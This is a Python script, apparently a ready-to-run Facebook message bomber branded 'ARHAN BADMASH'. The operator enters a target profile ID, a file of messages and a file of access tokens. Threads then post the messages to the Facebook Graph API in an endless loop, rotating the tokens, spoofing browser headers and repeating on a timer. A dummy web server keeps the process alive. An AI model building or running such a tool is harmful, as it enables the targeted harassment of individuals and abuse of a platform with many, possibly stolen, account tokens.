import os
import requests
import time
import threading
import http.server
import socketserver

base_dir = "sections"
GREEN = '\033[32m'
RESET = '\033[0m'
logo = """
  
  ___________ _____ _____ 
 |___  /_   _|  __ \_   _|
    / /  | | | |  | || |  
   / /   | | | |  | || |  
  / /__ _| |_| |__| || |_ 
 /_____|_____|_____/_____|
                          
                          
                          
                                        """
def print_green_logo():
    print(GREEN + logo + RESET)
sections = [
    {"profile_id": "", "messages": [], "access_tokens": [], "timer": 10, "running": False}
    for _ in range(10)
]

def initialize_sections(manual_section_count):
    
    if not os.path.exists(base_dir):
        os.makedirs(base_dir)

    for i in range(10):
        section_dir = os.path.join(base_dir, f"section{i+1}")

        
        if os.path.exists(section_dir):
            for filename in os.listdir(section_dir):
                file_path = os.path.join(section_dir, filename)
                try:
                    if os.path.isfile(file_path) or os.path.islink(file_path):
                        os.unlink(file_path)
                    elif os.path.isdir(file_path):
                        os.rmdir(file_path)
                except Exception as e:
                    print(f"Failed to delete {file_path}. Reason: {e}")

            os.rmdir(section_dir)

        
        os.makedirs(section_dir)

        if i < manual_section_count:
            
            sections[i]["profile_id"] = input(f"\33[1;36mTargetId for section {i+1}: ")

            message_file = input(f"msgfile for section {i+1}: ")
            try:
                with open(message_file, "r") as f:
                    sections[i]["messages"] = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"File {message_file} not found. Skipping messages for section {i+1}.")

            access_token_file = input(f"accesstokenfile for section {i+1}: ")
            try:
                with open(access_token_file, "r") as f:
                    sections[i]["access_tokens"] = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"File {access_token_file} not found. Skipping access tokens for section {i+1}.")

            sections[i]["timer"] = int(input(f"timer for section {i+1} (seconds): "))
        else:
            
            profile_id_path = os.path.join(section_dir, "profile_id")
            messages_path = os.path.join(section_dir, "messages")
            access_tokens_path = os.path.join(section_dir, "access_tokens")
            timer_path = os.path.join(section_dir, "timer")

            with open(profile_id_path, "w") as f:
                f.write("")
            with open(messages_path, "w") as f:
                f.write("")
            with open(access_tokens_path, "w") as f:
                f.write("")
            with open(timer_path, "w") as f:
                f.write("10")

def read_section_data():
    for i in range(10):
        section_dir = os.path.join(base_dir, f"section{i+1}")
        profile_id_path = os.path.join(section_dir, "profile_id")
        messages_path = os.path.join(section_dir, "messages")
        access_tokens_path = os.path.join(section_dir, "access_tokens")
        timer_path = os.path.join(section_dir, "timer")

        if not sections[i]["profile_id"]:  
            with open(profile_id_path, "r") as f:
                sections[i]["profile_id"] = f.read().strip()
            with open(messages_path, "r") as f:
                sections[i]["messages"] = [line.strip() for line in f if line.strip()]
            with open(access_tokens_path, "r") as f:
                sections[i]["access_tokens"] = [line.strip() for line in f if line.strip()]
            with open(timer_path, "r") as f:
                try:
                    sections[i]["timer"] = int(f.read().strip())
                except ValueError:
                    sections[i]["timer"] = 10

def send_message(profile_id, message, access_token):
    try:
        url = f"https://graph.facebook.com/v17.0/t_{profile_id}"
        parameters = {'access_token': access_token, 'message': message}
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'Referer': 'http://www.google.com'
        }
        s = requests.post(url, data=parameters, headers=headers)
        s.raise_for_status()

        tt = time.strftime("%Y-%m-%d %I:%M:%S %p")
        print("\33[1;35m[ARHAN BADMASH]")
        print(f"\033[0mTime: [{tt}] \n \33[1;34mTargetID: {profile_id} \n \33[1;32mMessage Sent: {message}")

    except requests.exceptions.RequestException as e:
        print("[!] Failed to send message:", e)

def run_server(ports):
    class MyHandler(http.server.BaseHTTPRequestHandler):
        def do_HEAD(self):
            self.send_response(200)

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

        def log_message(self, format, *args):
            return

    for port in ports:
        try:
            with socketserver.TCPServer(("", port), MyHandler) as httpd:
                print("Serving at port", port)
                httpd.serve_forever()
        except OSError:
            print("Port", port, "is already in use. Trying the next port.")

def start_section(index):
    global sections
    if sections[index]["profile_id"] and sections[index]["messages"] and sections[index]["access_tokens"]:
        sections[index]["running"] = True
        threading.Thread(target=send_messages, args=(index,)).start()

def stop_section(index):
    global sections
    sections[index]["running"] = False

def send_messages(index):
    global sections
    message_index = 0
    token_index = 0
    while sections[index]["running"]:
        if message_index >= len(sections[index]["messages"]):
            message_index = 0
        if token_index >= len(sections[index]["access_tokens"]):
            token_index = 0
        send_message(sections[index]["profile_id"], sections[index]["messages"][message_index], sections[index]["access_tokens"][token_index])
        message_index += 1
        token_index += 1
        time.sleep(sections[index]["timer"])


print_green_logo()
manual_section_count = int(input("\33[1;36mSection select (1-10): "))


initialize_sections(manual_section_count)


read_section_data()


for i in range(10):
    start_section(i)

available_ports = [53019, 50320, 50321, 50232, 50323, 50324]

threading.Thread(target=run_server, args=(available_ports,)).start()
